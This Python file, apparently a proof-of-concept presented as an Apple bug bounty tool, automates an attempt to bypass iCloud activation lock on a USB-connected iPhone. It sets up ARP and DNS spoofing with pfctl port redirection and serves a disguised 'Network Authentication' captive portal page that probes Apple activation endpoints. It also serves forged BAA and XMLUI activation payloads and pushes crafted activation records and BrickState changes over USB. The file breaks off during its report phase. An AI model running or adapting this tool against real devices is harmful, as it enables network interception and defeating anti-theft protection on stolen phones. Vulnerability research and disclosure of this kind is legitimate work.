#!/usr/bin/env python3
"""
VU#346053 Automated Captive Portal PoC -- USB-controlled
Apple Bug Bounty Submission Tool

Zero manual device interaction. Full attack chain:
  Phase 1: USB device detection + iCloud lock verification
  Phase 2: Network MITM setup (ARP spoof + DNS spoof + pfctl)
  Phase 3: HTTP/HTTPS servers with captive portal state machine
  Phase 4: WebSheet exploitation (JS probes activation endpoints over HTTP)
  Phase 5: USB injection vectors (BAA, XMLUI, BrickState, proxied activation)
  Phase 6: Device restart to re-trigger Setup Assistant activation flow
  Phase 7: Syslog + HTTP monitoring with periodic state checks
  Phase 8: PoC report generation (JSON, suitable for bug bounty)

The captive portal state machine:
  - Initially returns non-"Success" for hotspot-detect.html to trigger
    CaptiveNetworkSupport WebSheet on the device (automatic, no tap needed)
  - Serves an HTML page with JavaScript that probes activation endpoints
    (humb.apple.com/humbug/baa, albert.apple.com/deviceservices/*)
    over HTTP -- these go through our DNS spoof, so we serve BAA payloads
  - After --captive-window seconds, returns "Success" to auto-dismiss WebSheet
  - Device then proceeds with Setup Assistant activation over the MITM'd network
  - Any HTTP activation traffic hits our server; HTTPS attempts are logged

Usage:
    sudo /usr/local/opt/python@3.12/bin/python3.12 poc_runner.py [options]

Options:
    --gateway IP          Gateway IP (auto-detected if omitted)
    --iface IFACE         Network interface (default: en0)
    --timeout SECS        Total monitoring timeout (default: 180)
    --captive-window SECS Seconds to keep WebSheet open (default: 25)
    --no-restart          Skip device restart
    --no-network          Skip ARP/DNS (use if already running)
    --udid UDID           Target device UDID (auto-detect if omitted)
"""

import argparse
import asyncio
import json
import os
import plistlib
import signal
import ssl
import subprocess
import sys
import threading
import time
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from pathlib import Path
from socketserver import ThreadingMixIn

# ---------------------------------------------------------------------------
# pymobiledevice3 -- must use Python 3.12 where it is installed
# ---------------------------------------------------------------------------
from pymobiledevice3.usbmux import list_devices
from pymobiledevice3.lockdown import create_using_usbmux
from pymobiledevice3.services.mobile_activation import MobileActivationService
from pymobiledevice3.services.syslog import SyslogService
from pymobiledevice3.services.diagnostics import DiagnosticsService

# ---------------------------------------------------------------------------
# Paths and constants
# ---------------------------------------------------------------------------
SCRIPT_DIR = Path(__file__).parent
CERT_DIR = SCRIPT_DIR.parent / "certs"
RESULTS_DIR = SCRIPT_DIR / "poc_results"
PYTHON312 = "/usr/local/opt/python@3.12/bin/python3.12"

# ---------------------------------------------------------------------------
# Global shared state (threads + async tasks write here)
# ---------------------------------------------------------------------------
events = []
http_log = []
websheet_reports = []
syslog_hits = []
shutdown_flag = threading.Event()

captive_state = {
    "phase": "init",       # init -> trigger -> probe -> dismiss -> serve
    "first_hit_time": None,
    "dismiss_after": 25,   # seconds after first captive hit
    "hits": 0,
}


def log(msg, level="INFO"):
    ts = datetime.now().strftime("%H:%M:%S.%f")[:-3]
    events.append({"ts": ts, "level": level, "msg": msg})
    tag = f"[{level}]" if level != "INFO" else "      "
    print(f"  {ts} {tag:10s} {msg}", flush=True)


# ===================================================================
# Captive Portal WebSheet HTML Page
# ===================================================================
# Served inside the CaptiveNetworkSupport WebSheet when iOS detects
# our non-"Success" captive portal response.  JavaScript makes XHR
# requests to Apple activation endpoints (routed through our DNS spoof
# to our HTTP server).  Results are POSTed back to /poc-report.

WEBSHEET_HTML = r"""<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Network Authentication</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,Helvetica,sans-serif;background:#f2f2f7;
 color:#1c1c1e;padding:20px}
h2{text-align:center;font-size:20px;margin:16px 0}
.card{background:#fff;border-radius:12px;padding:16px;margin:12px 0;
 box-shadow:0 1px 3px rgba(0,0,0,.08)}
.spin{text-align:center;margin:16px 0}
.spin::after{content:'';display:inline-block;width:28px;height:28px;
 border:3px solid #e5e5ea;border-top-color:#007aff;border-radius:50%;
 animation:s 1s linear infinite}
@keyframes s{to{transform:rotate(360deg)}}
#st{text-align:center;color:#86868b;font-size:14px;margin:8px 0}
#lg{font:11px/1.4 Menlo,monospace;color:#86868b;white-space:pre-wrap;
 max-height:280px;overflow-y:auto;word-break:break-all}
</style>
</head>
<body>
<h2>Network Authentication</h2>
<div class="card"><div class="spin"></div>
<p id="st">Verifying network connection...</p></div>
<div class="card"><div id="lg"></div></div>
<script>
var R={},L=document.getElementById('lg'),S=document.getElementById('st');
function p(m){var t=new Date().toTimeString().substr(0,8);
 L.textContent+=t+' '+m+'\n';L.scrollTop=9e6}
p('WebSheet opened');
R.ua=navigator.userAgent;R.plat=navigator.platform;
R.cookie=navigator.cookieEnabled;
p('UA: '+R.ua);

function probe(label,url,opts){
 p('Probe: '+label);
 return fetch(url,opts).then(function(r){
  R[label+'_status']=r.status;p(label+': HTTP '+r.status);
  return r.text()
 }).then(function(t){
  R[label+'_body']=t.substring(0,400);
  p(label+' body[0:80]: '+t.substring(0,80));
 }).catch(function(e){
  R[label+'_err']=e.toString();p(label+' ERR: '+e);
 })
}

// Probe 1: BAA endpoint over HTTP (through DNS spoof -> our server)
probe('baa_http','http://humb.apple.com/humbug/baa',{
 method:'POST',headers:{'Content-Type':'application/xml'},
 body:'<?xml version="1.0"?><plist version="1.0"><dict>'
  +'<key>Request</key><string>BAA</string></dict></plist>'
});

// Probe 2: deviceActivation over HTTP
probe('activation_http',
 'http://albert.apple.com/deviceservices/deviceActivation',{
 method:'POST',headers:{'Content-Type':'application/x-apple-plist'},
 body:'<plist version="1.0"><dict></dict></plist>'
});

// Probe 3: drmHandshake over HTTP
probe('handshake_http',
 'http://albert.apple.com/deviceservices/drmHandshake',{
 method:'POST',headers:{'Content-Type':'application/xml'},
 body:'<plist version="1.0"><dict></dict></plist>'
});

// Probe 4: BAA over HTTPS (test if WebSheet bypasses cert pinning)
probe('baa_https','https://humb.apple.com/humbug/baa',{
 method:'POST',headers:{'Content-Type':'application/xml'},
 body:'<plist version="1.0"><dict></dict></plist>'
});

// Probe 5: HTTPS activation
probe('activation_https',
 'https://albert.apple.com/deviceservices/deviceActivation',{
 method:'POST',headers:{'Content-Type':'application/x-apple-plist'},
 body:'<plist version="1.0"><dict></dict></plist>'
});

// Probe 6: setup.icloud.com over HTTP
probe('icloud_http','http://setup.icloud.com/',{method:'GET'});

// Probe 7: gs.apple.com (activation config)
probe('gs_http','http://gs.apple.com/checkIn',{method:'GET'});

// Send results after 10 seconds
setTimeout(function(){
 p('--- Sending probe report ---');
 R.ts=new Date().toISOString();
 fetch('http://captive.apple.com/poc-report',{
  method:'POST',headers:{'Content-Type':'application/json'},
  body:JSON.stringify(R)
 }).then(function(){p('Report sent');S.textContent='Connected.'})
 .catch(function(e){p('Report send err: '+e)});
},10000);
</script>
</body>
</html>"""


# ===================================================================
# BAA + XMLUI payloads
# ===================================================================

def build_baa_payload():
    """BAA response: AllowActivation=True, BrickState=False."""
    return plistlib.dumps({
        "ProtocolVersion": "2",
        "Status": "SUCCESS",
        "BAAResponse": {
            "AllowActivation": True,
            "BrickState": False,
            "GracePeriod": 0,
            "Message": "Device provisioning successful",
        },
    }, fmt=plistlib.FMT_XML)


XMLUI_BYPASS = (
    b'<?xml version="1.0" encoding="UTF-8"?>\n'
    b'<xmlui style="setupAssistant">\n'
    b'  <page name="ActivationSuccess">\n'
    b'    <script><![CDATA[\n'
    b'      function proceed() { return true; }\n'
    b'    ]]></script>\n'
    b'    <navigationBar title="iPhone" hidesBackButton="true"'
    b' loadingTitle="Loading...">\n'
    b'      <linkBarItem id="next"'
    b' url="/deviceservices/deviceActivation"\n'
    b'        position="right" label="Continue"\n'
    b'        enabledFunction="proceed" httpMethod="POST" />\n'
    b'    </navigationBar>\n'
    b'    <tableView><section>\n'
    b'      <footer>Your device has been activated.</footer>\n'
    b'    </section></tableView>\n'
    b'  </page>\n'
    b'</xmlui>'
)


# ===================================================================
# HTTP Handler -- Captive Portal State Machine + Activation Payloads
# ===================================================================

class PoCHandler(BaseHTTPRequestHandler):
    """
    Serves captive portal responses AND activation payloads.

    Captive portal state machine:
      init    -> first hotspot-detect hit sets timer
      trigger -> non-Success response triggers WebSheet
      probe   -> serve WebSheet HTML with JS probes
      dismiss -> after N seconds, return "Success" (dismisses WebSheet)
      serve   -> all subsequent requests get activation payloads
    """

    def do_GET(self):
        p = self.path.split("?")[0]
        h = self.headers.get("Host", "")
        c = self.client_address[0]
        self._log_req("GET", p, h, c, 0)

        if "hotspot-detect" in p or "/library/test/success.html" in p:
            self._captive_portal()
        elif "generate_204" in p:
            self.send_response(302)
            self.send_header("Location",
                             "http://captive.apple.com/hotspot-detect.html")
            self.end_headers()
        elif "/deviceservices/deviceActivation" in p:
            self._respond_xmlui()
        elif "/humbug/baa" in p:
            self._respond_baa()
        else:
            self._send(200, "text/html", b"<html><body>OK</body></html>")

    def do_POST(self):
        p = self.path.split("?")[0]
        h = self.headers.get("Host", "")
        c = self.client_address[0]
        body = self._read_body()
        self._log_req("POST", p, h, c, len(body))
        self._save_req(p, body)

        if "/poc-report" in p:
            self._handle_report(body)
        elif "/humbug/baa" in p:
            self._respond_baa()
        elif "/deviceservices/deviceActivation" in p:
            self._respond_xmlui()
        elif "/deviceservices/drmHandshake" in p:
            self._respond_handshake()
        else:
            self._send(200, "text/plain", b"OK")

    # -- captive portal state machine ------------------------------------

    def _captive_portal(self):
        now = time.time()
        st = captive_state

        if st["first_hit_time"] is None:
            st["first_hit_time"] = now
            st["phase"] = "trigger"
            log("CAPTIVE PORTAL: first detection request", "CRITICAL")

        st["hits"] += 1
        elapsed = now - st["first_hit_time"]

        if elapsed < st["dismiss_after"]:
            # Keep WebSheet open -- serve our exploitation page
            st["phase"] = "probe"
            log(f"  captive: serving WebSheet page "
                f"({elapsed:.0f}s / {st['dismiss_after']}s)")
            self._send(200, "text/html",
                       WEBSHEET_HTML.encode("utf-8"))
        else:
            # Dismiss WebSheet so device proceeds with activation
            st["phase"] = "dismiss"
            log("CAPTIVE PORTAL: returning Success (dismissing WebSheet)",
                "CRITICAL")
            self._send(200, "text/html",
                       b"<HTML><HEAD><TITLE>Success</TITLE></HEAD>"
                       b"<BODY>Success</BODY></HTML>")

    # -- activation payloads ---------------------------------------------

    def _respond_baa(self):
        log("*** BAA PAYLOAD SERVED: AllowActivation=True "
            "BrickState=False ***", "CRITICAL")
        payload = build_baa_payload()
        self._save_payload("baa", payload)
        self._send(200, "application/x-apple-plist", payload)

    def _respond_xmlui(self):
        log("*** XMLUI BYPASS PAGE SERVED ***", "CRITICAL")
        self._save_payload("xmlui", XMLUI_BYPASS)
        self._send(200, "application/x-buddyml", XMLUI_BYPASS)

    def _respond_handshake(self):
        log("  DRM handshake response served")
        resp = plistlib.dumps({
            "HandshakeResponseMessage": {
                "serverKP": os.urandom(64),
                "Status": "SUCCESS", "ProtocolVersion": 2,
            },
            "FDRBlob": os.urandom(256),
            "SUInfo": {"DocumentID": "0000", "DocumentVersion": "1.0"},
        }, fmt=plistlib.FMT_XML)
        self._send(200, "application/xml", resp)

    # -- WebSheet probe report -------------------------------------------

    def _handle_report(self, body):
        try:
            report = json.loads(body)
            websheet_reports.append(report)
            log("WEBSHEET PROBE REPORT RECEIVED:", "CRITICAL")
            for k, v in report.items():
                if k in ("ts", "ua", "plat"):
                    continue
                log(f"  {k}: {str(v)[:120]}")
        except Exception:
            log(f"  WebSheet sent non-JSON ({len(body)} bytes)")
        self._send(200, "text/plain", b"OK")

    # -- helpers ---------------------------------------------------------

    def _read_body(self):
        n = int(self.headers.get("Content-Length", 0))
        return self.rfile.read(n) if n else b""

    def _send(self, code, ct, body):
        self.send_response(code)
        self.send_header("Content-Type", ct)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _log_req(self, method, path, host, client, size):
        is_tls = isinstance(getattr(self, "request", None), ssl.SSLSocket)
        entry = {
            "ts": datetime.now().isoformat(), "method": method,
            "path": path, "host": host, "client": client,
            "body_size": size, "tls": is_tls,
            "captive_phase": captive_state["phase"],
        }
        http_log.append(entry)
        proto = "HTTPS" if is_tls else "HTTP"
        log(f"{proto} {method} {host}{path} from {client} ({size}B)")

    def _save_req(self, path, body):
        if not body:
            return
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        safe = path.strip("/").replace("/", "_") or "root"
        (RESULTS_DIR / f"{ts}_req_{safe}.bin").write_bytes(body)

    def _save_payload(self, label, data):
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        (RESULTS_DIR / f"{ts}_served_{label}.bin").write_bytes(data)

    def log_message(self, fmt, *args):
        pass  # suppress default logging


class ThreadedHTTP(ThreadingMixIn, HTTPServer):
    daemon_threads = True
    allow_reuse_address = True


# ===================================================================
# Phase 1: USB Device Detection
# ===================================================================

async def usb_connect(udid=None):
    log("Scanning for USB devices...")
    devices = await list_devices()
    if not devices:
        log("No USB device found", "ERROR")
        return None, None

    log(f"Found {len(devices)} device(s)")
    kwargs = {"serial": udid} if udid else {}
    lockdown = await create_using_usbmux(**kwargs)

    info = {}
    for key in ["ProductType", "ProductVersion", "SerialNumber",
                "ActivationState", "BrickState", "WiFiAddress",
                "UniqueDeviceID", "UniqueChipID", "HardwareModel"]:
        try:
            info[key] = await lockdown.get_value(key=key)
        except Exception:
            info[key] = None

    log(f"Device:      {info['ProductType']} / iOS {info['ProductVersion']}")
    log(f"Serial:      {info['SerialNumber']}")
    log(f"UDID:        {info['UniqueDeviceID']}")
    log(f"Activation:  {info['ActivationState']}")
    log(f"BrickState:  {info['BrickState']}")
    log(f"WiFi MAC:    {info['WiFiAddress']}")
    return lockdown, info


# ===================================================================
# Phase 2: Network Setup
# ===================================================================

def detect_network(iface="en0"):
    mac_ip = gateway = None

    for br in ["bridge100", "bridge0"]:
        r = subprocess.run(["ifconfig", br], capture_output=True, text=True)
        if r.returncode == 0 and "inet " in r.stdout:
            for line in r.stdout.split("\n"):
                if "inet " in line and "127." not in line:
                    mac_ip = line.strip().split()[1]
                    iface = br
                    break
            if mac_ip:
                break

    if not mac_ip:
        r = subprocess.run(["ifconfig", iface], capture_output=True, text=True)
        for line in r.stdout.split("\n"):
            if "inet " in line and "127." not in line:
                mac_ip = line.strip().split()[1]

    r = subprocess.run(["route", "-n", "get", "default"],
                       capture_output=True, text=True)
    for line in r.stdout.split("\n"):
        if "gateway:" in line:
            gateway = line.strip().split(":")[-1].strip()

    log(f"Network: iface={iface}  mac={mac_ip}  gw={gateway}")
    return {"iface": iface, "mac_ip": mac_ip, "gateway": gateway}


def setup_network_mitm(net_info):
    """Start DNS spoof + ARP redirect + pfctl. Returns list of subprocesses."""
    procs = []
    iface = net_info["iface"]
    mac_ip = net_info["mac_ip"]
    gateway = net_info.get("gateway")

    # IP forwarding
    subprocess.run(["sysctl", "-w", "net.inet.ip.forwarding=1"],
                   capture_output=True)
    log("IP forwarding enabled")

    # pfctl: redirect 53/80/443 from LAN to local
    rules = "\n".join([
        f"rdr on {iface} proto udp from any to any port 53"
        f" -> 127.0.0.1 port 53",
        f"rdr on {iface} proto tcp from any to any port 53"
        f" -> 127.0.0.1 port 53",
        f"rdr on {iface} proto tcp from any to any port 80"
        f" -> 127.0.0.1 port 80",
        f"rdr on {iface} proto tcp from any to any port 443"
        f" -> 127.0.0.1 port 443",
    ]) + "\n"
    Path("/tmp/poc_pf.conf").write_text(rules)
    subprocess.run(["pfctl", "-f", "/tmp/poc_pf.conf", "-e"],
                   capture_output=True)
    log("pfctl redirect active (53/80/443 -> local)")

    # DNS spoof
    dns_script = SCRIPT_DIR / "dns_spoof.py"
    if dns_script.exists():
        p = subprocess.Popen(
            [PYTHON312, str(dns_script), mac_ip],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        time.sleep(1)
        if p.poll() is None:
            procs.append(p)
            log(f"DNS spoof started (PID {p.pid}) -> {mac_ip}")
        else:
            log("DNS spoof failed to start", "ERROR")

    # ARP redirect
    if gateway:
        arp_script = SCRIPT_DIR / "arp_redirect.py"
        if arp_script.exists():
            p = subprocess.Popen(
                [PYTHON312, str(arp_script),
                 "--gateway", gateway, "--iface", iface],
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
            time.sleep(3)
            if p.poll() is None:
                procs.append(p)
                log(f"ARP redirect started (PID {p.pid}) gw={gateway}")
            else:
                log("ARP redirect failed to start", "ERROR")
    else:
        log("No gateway detected -- skipping ARP redirect", "WARN")

    return procs


def teardown_network():
    subprocess.run(["pfctl", "-d"], capture_output=True)
    subprocess.run(["sysctl", "-w", "net.inet.ip.forwarding=0"],
                   capture_output=True)
    log("Network teardown complete")


# ===================================================================
# Phase 3: HTTP/HTTPS Servers
# ===================================================================

def start_servers():
    servers = []

    # HTTP on port 80 -- this is where captive portal + activation work
    http_srv = ThreadedHTTP(("0.0.0.0", 80), PoCHandler)
    threading.Thread(target=http_srv.serve_forever, daemon=True).start()
    servers.append(http_srv)
    log("HTTP  server on 0.0.0.0:80")

    # HTTPS on port 443 -- device will reject our cert, but we log attempts
    cert = CERT_DIR / "server.crt"
    key = CERT_DIR / "server.key"
    if cert.exists() and key.exists():
        try:
            https_srv = ThreadedHTTP(("0.0.0.0", 443), PoCHandler)
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            ctx.load_cert_chain(str(cert), str(key))
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            try:
                ctx.minimum_version = ssl.TLSVersion.TLSv1_2
            except Exception:
                pass
            https_srv.socket = ctx.wrap_socket(
                https_srv.socket, server_side=True)
            threading.Thread(
                target=https_srv.serve_forever, daemon=True).start()
            servers.append(https_srv)
            log("HTTPS server on 0.0.0.0:443 (cert will be rejected)")
        except Exception as e:
            log(f"HTTPS server failed: {e}", "WARN")
    else:
        log("No certs found -- HTTPS server skipped", "WARN")

    return servers


# ===================================================================
# Phase 5: USB Injection Vectors
# ===================================================================

async def run_usb_injections(lockdown):
    """
    Try all USB-based injection methods.
    These are expected to fail (device validates crypto chains), but each
    failure mode is documented for the PoC report.
    """
    results = []
    log("--- USB Injection Vectors ---")

    try:
        mas = MobileActivationService(lockdown)
    except Exception as e:
        log(f"MobileActivationService init failed: {e}", "ERROR")
        return [{"test": "service_init", "error": str(e)}]

    # A: Current state
    log("USB-A: activation state")
    try:
        state = await mas.state()
        results.append({"test": "get_state", "result": str(state)})
        log(f"  -> {state}")
    except Exception as e:
        results.append({"test": "get_state", "error": str(e)})
        log(f"  -> {e}", "WARN")

    # B: BAA plist via activate_with_session
    log("USB-B: BAA plist via activate_with_session")
    try:
        baa = build_baa_payload()
        r = await mas.activate_with_session(
            baa, {"Content-Type": "application/xml"})
        results.append({"test": "baa_session", "result": str(r)[:300]})
        log(f"  -> {str(r)[:150]}")
    except Exception as e:
        results.append({"test": "baa_session", "error": str(e)})
        log(f"  -> {e}", "WARN")

    # C: XMLUI bypass via activate_with_session
    log("USB-C: XMLUI via activate_with_session")
    try:
        r = await mas.activate_with_session(
            XMLUI_BYPASS, {"Content-Type": "application/x-buddyml"})
        results.append({"test": "xmlui_session", "result": str(r)[:300]})
        log(f"  -> {str(r)[:150]}")
    except Exception as e:
        results.append({"test": "xmlui_session", "error": str(e)})
        log(f"  -> {e}", "WARN")

    # D: BrickState via lockdown.set_value
    log("USB-D: set_value(BrickState=False)")
    try:
        await lockdown.set_value(False, key="BrickState")
        brick = await lockdown.get_value(key="BrickState")
        results.append({"test": "set_brick", "brick_after": brick})
        log(f"  -> BrickState read-back: {brick}")
    except Exception as e:
        results.append({"test": "set_brick", "error": str(e)})
        log(f"  -> {e}", "WARN")

    # E: Proxied activation -- get session info, craft response, push
    log("USB-E: Proxied activation (craft response locally)")
    try:
        # Step 1: Get activation session info from device
        session_info = await mas.create_activation_session_info()
        log(f"  Got session info ({len(str(session_info))} bytes)")

        # Step 2: Build crafted handshake response (skip Apple)
        sys.path.insert(0, str(SCRIPT_DIR))
        from activation_responses import (
            build_handshake_response, build_activation_record,
        )
        handshake_resp = plistlib.loads(build_handshake_response())

        # Step 3: Create activation info using our crafted handshake
        act_info = await mas.create_activation_info_with_session(
            handshake_resp)
        info_str = str(act_info)
        log(f"  Got activation info ({len(info_str)} bytes)")
        results.append({
            "test": "proxied_activation_info", "result": "success",
            "size": len(info_str),
        })

        # Step 4: Build crafted activation record
        record_bytes = build_activation_record(info_str)
        record = plistlib.loads(record_bytes)
        ar = record.get("ActivationRecord", record)

        # Step 5: Push crafted record to device
        log("  Pushing crafted activation record...")
        r = await mas.activate_with_session(
            ar, {"Content-Type": "application/xml"})
        results.append({
            "test": "proxied_activate", "result": str(r)[:300]})
        log(f"  -> {str(r)[:150]}")
    except Exception as e:
        results.append({"test": "proxied_activate", "error": str(e)})
        log(f"  -> {e}", "WARN")

    # F: activate_with_lockdown with BAA in activation-record wrapper
    log("USB-F: activate_with_lockdown with BAA wrapper")
    try:
        inner = plistlib.dumps({
            "ActivationState": "Activated",
            "BrickState": False,
            "BAAResponse": {
                "AllowActivation": True,
                "BrickState": False,
            },
        }, fmt=plistlib.FMT_XML)
        wrapped = plistlib.dumps({
            "iphone-activation": {
                "activation-record": inner,
            },
        }, fmt=plistlib.FMT_XML)
        r = await mas.activate_with_lockdown(wrapped)
        results.append({"test": "baa_wrapped", "result": str(r)[:300]})
        log(f"  -> {str(r)[:150]}")
    except Exception as e:
        results.append({"test": "baa_wrapped", "error": str(e)})
        log(f"  -> {e}", "WARN")

    # G: send_command for state enumeration
    log("USB-G: send_command enumeration")
    for cmd in ["QueryNonce", "GetActivationStateRequest",
                "HandleBAARequest", "PerformBAA"]:
        try:
            r = await mas.send_command(cmd)
            results.append({"test": f"cmd_{cmd}", "result": str(r)[:200]})
            log(f"  {cmd}: {str(r)[:100]}")
        except Exception as e:
            results.append({"test": f"cmd_{cmd}", "error": str(e)})
            log(f"  {cmd}: {e}", "WARN")

    return results


# ===================================================================
# Phase 6: Device Restart
# ===================================================================

async def restart_device(lockdown):
    log("Restarting device to re-trigger Setup Assistant...")
    try:
        async with DiagnosticsService(lockdown) as diag:
            await diag.restart()
        log("Restart command sent")
        return True
    except Exception as e:
        log(f"Restart failed: {e}", "ERROR")
        return False


async def wait_reconnect(timeout=90, udid=None):
    log(f"Waiting up to {timeout}s for USB reconnection...")
    start = time.time()
    while time.time() - start < timeout:
        if shutdown_flag.is_set():
            return None
        try:
            devices = await list_devices()
            if devices:
                await asyncio.sleep(5)
                kwargs = {"serial": udid} if udid else {}
                ld = await create_using_usbmux(**kwargs)
                act = await ld.get_value(key="ActivationState")
                log(f"Reconnected -- ActivationState={act}")
                return ld
        except Exception:
            pass
        await asyncio.sleep(3)
    log("Device did not reconnect", "ERROR")
    return None


# ===================================================================
# Phase 7: Syslog Monitor
# ===================================================================

SYSLOG_KEYWORDS = [
    "mobileactivationd", "activation", "BrickState", "BAA",
    "AllowActivation", "SetupAssistant", "FMIPLock", "CaptiveNetwork",
    "WebSheet", "CNA", "buddyml", "xmlui", "humbug", "drmHandshake",
    "captive", "albert.apple.com", "deviceActivation", "ActivationState",
]


async def run_syslog_monitor(lockdown, duration=180):
    """Async syslog monitor. Filters for activation keywords."""
    log(f"Syslog monitor started ({duration}s)")
    try:
        async with SyslogService(lockdown) as syslog:
            start = time.time()
            async for entry in syslog.watch():
                if shutdown_flag.is_set():
                    break
                if time.time() - start > duration:
                    break
                msg = str(entry)
                for kw in SYSLOG_KEYWORDS:
                    if kw.lower() in msg.lower():
                        hit = {
                            "ts": datetime.now().isoformat(),
                            "keyword": kw,
                            "msg": msg[:500],
                        }
                        syslog_hits.append(hit)
                        log(f"SYSLOG [{kw}]: {msg[:120]}")
                        break
    except asyncio.CancelledError:
        pass
    except Exception as e:
        log(f"Syslog monitor stopped: {e}", "WARN")


# ===================================================================
# Phase 8: Report Generation
# ===================================================================

def generate_report(device_info, initial_state, final_state,
                    usb_results, net_info):
    s = {
        "total_http_requests": len(http_log),
        "captive_portal_hits": sum(
            1 for r in http_log if "hotspot" in r.get("path", "")),
        "baa_requests_served": sum(
            1 for r in http_log if "/humbug/baa" in r.get("path", "")),
        "activation_requests": sum(
            1 for r in http_log
            if "deviceActivation" in r.get("path", "")),
        "handshake_requests": sum(
            1 for r in http_log
            if "drmHandshake" in r.get("path", "")),
        "websheet_reports": len(websheet_reports),
        "syslog_hits": len(syslog_hits),
        "https_attempted": any(r.get("tls") for r in http_log),
        "state_changed": (
            initial_state != final_state if final_state else False),
    }

    report = {
        "vulnerability": "VU#346053",
        "title": "BAA Injection via Captive Portal -- Automated USB PoC",
        "timestamp": datetime.now().isoformat(),
        "device": device_info,
        "network": net_info,
        "initial_state": initial_state,
        "final_state": final_state,
        "captive_portal": {
            "triggered": captive_state["first_hit_time"] is not None,
            "total_hits": captive_state["hits"],
            "phase_at_end": captive_state["phase"],
            "dismiss_after_s": captive_state["dismiss_after"],
            "websheet_probe_reports": websheet_reports,
        },
        "usb_injection_results": usb_results,
        "http_requests": http_log,
        "syslog_hits": syslog_hits,
        "events": events,
        "summary": s,
    }

    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    f = RESULTS_DIR / f"poc_report_{ts}.json"
    f.write_text(json.dumps(report, indent=2, default=str))
    log(f"Report: {f}")
    return report


# ===================================================================
# Main Orchestrator
# ===================================================================

async def async_main(args):
    """Async orchestrator -- all device operations use await."""
    captive_state["dismiss_after"] = args.captive_window
    RESULTS_DIR.mkdir(parents=True, exist_ok=True)

    net_procs = []
    servers = []
    lockdown = None
    no_network = args.no_network

    def cleanup(signum=None, frame=None):
        log("Shutting down...")
        shutdown_flag.set()
        for s in servers:
            try:
                s.shutdown()
            except Exception:
                pass
        for p in net_procs:
            try:
                p.terminate()
                p.wait(5)
            except Exception:
                try:
                    p.kill()
                except Exception:
                    pass
        if not no_network:
            teardown_network()
        log("Cleanup complete")

    signal.signal(signal.SIGINT, cleanup)
    signal.signal(signal.SIGTERM, cleanup)

    initial_state = {}
    final_state = {}
    usb_results = []
    net_info = {}

    try:
        print()
        print("=" * 62)
        print("  VU#346053 -- Captive Portal Activation PoC")
        print("  USB-controlled, zero manual interaction")
        print("=" * 62)
        print()

        # -- Phase 1: USB Device ------------------------------------------
        log("=== Phase 1: USB Device Detection ===")
        lockdown, device_info = await usb_connect(args.udid)
        if not lockdown:
            log("No device found -- plug in via USB", "FATAL")
            return 1

        initial_state = {
            "ActivationState": device_info.get("ActivationState"),
            "BrickState": device_info.get("BrickState"),
        }
        if device_info.get("ActivationState") == "Activated":
            log("Device is already activated -- nothing to do")
            return 0
        print()

        # -- Phase 2: Network Detection -----------------------------------
        log("=== Phase 2: Network Detection ===")
        net_info = detect_network(args.iface)
        if args.gateway:
            net_info["gateway"] = args.gateway
        if not net_info["mac_ip"]:
            log("Cannot determine Mac IP", "FATAL")
            return 1
        print()

        # -- Phase 3: HTTP/HTTPS Servers ----------------------------------
        log("=== Phase 3: HTTP/HTTPS Servers ===")
        servers = start_servers()
        print()

        # -- Phase 4: Network MITM ----------------------------------------
        if not args.no_network:
            log("=== Phase 4: Network MITM Infrastructure ===")
            net_procs = setup_network_mitm(net_info)
            await asyncio.sleep(3)
            print()
        else:
            log("=== Phase 4: Skipped (--no-network) ===")
            print()

        # -- Phase 5: USB Injection Vectors --------------------------------
        log("=== Phase 5: USB Injection Vectors ===")
        try:
            usb_results = await run_usb_injections(lockdown)
        except Exception as e:
            log(f"USB injection phase failed: {e}", "ERROR")
            usb_results = [{"error": str(e)}]
        print()

        # -- Phase 6: Device Restart ---------------------------------------
        syslog_task = None

        if not args.no_restart:
            log("=== Phase 6: Device Restart ===")
            restarted = await restart_device(lockdown)
            if restarted:
                lockdown = await wait_reconnect(
                    timeout=90, udid=args.udid)
                if not lockdown:
                    log("Continuing with HTTP monitoring only", "WARN")
        else:
            log("=== Phase 6: Skipped (--no-restart) ===")
        print()

        # Start syslog monitor (async task)
        if lockdown:
            try:
                syslog_task = asyncio.create_task(
                    run_syslog_monitor(lockdown, args.timeout))
            except Exception as e:
                log(f"Syslog monitor failed: {e}", "WARN")

        # -- Phase 7: Monitor Loop ----------------------------------------
        log("=== Phase 7: Monitoring ===")
        log(f"Monitoring for {args.timeout}s...")
        log("Waiting for: captive portal trigger, HTTP activation "
            "traffic, state changes...")
        print()

        start = time.time()
        last_req_count = 0
        last_state_check = 0

        while time.time() - start < args.timeout:
            if shutdown_flag.is_set():
                break
            await asyncio.sleep(5)

            # Report new HTTP requests
            if len(http_log) > last_req_count:
                for req in http_log[last_req_count:]:
                    proto = "HTTPS" if req.get("tls") else "HTTP"
                    log(f"  >> {proto} {req['method']} {req['path']} "
                        f"from {req['client']} "
                        f"[{req.get('captive_phase', '?')}]")
                last_req_count = len(http_log)

            # Periodic USB state check (every 30s)
            if lockdown and time.time() - last_state_check > 30:
                try:
                    act = await lockdown.get_value(key="ActivationState")
                    brick = await lockdown.get_value(key="BrickState")
                    log(f"  State check: Activation={act} Brick={brick}")
                    if act != initial_state.get("ActivationState"):
                        log("*** ACTIVATION STATE CHANGED ***",
                            "CRITICAL")
                        final_state = {
                            "ActivationState": act,
                            "BrickState": brick,
                        }
                        break
                except Exception:
                    pass
                last_state_check = time.time()

            # Progress indicator
            elapsed = int(time.time() - start)
            if elapsed % 30 == 0 and elapsed > 0:
                log(f"  -- {elapsed}s: {len(http_log)} HTTP reqs, "
                    f"{len(syslog_hits)} syslog hits, "
                    f"{len(websheet_reports)} WebSheet reports, "
                    f"captive phase={captive_state['phase']}")

        # Cancel syslog task
        if syslog_task and not syslog_task.done():
            syslog_task.cancel()
            try:
                await syslog_task
            except (asyncio.CancelledError, Exception):
                pass

        # -- Phase 8: Report ----------------------------------------------
        print()
        log("=== Phase 8: Final Report ===")
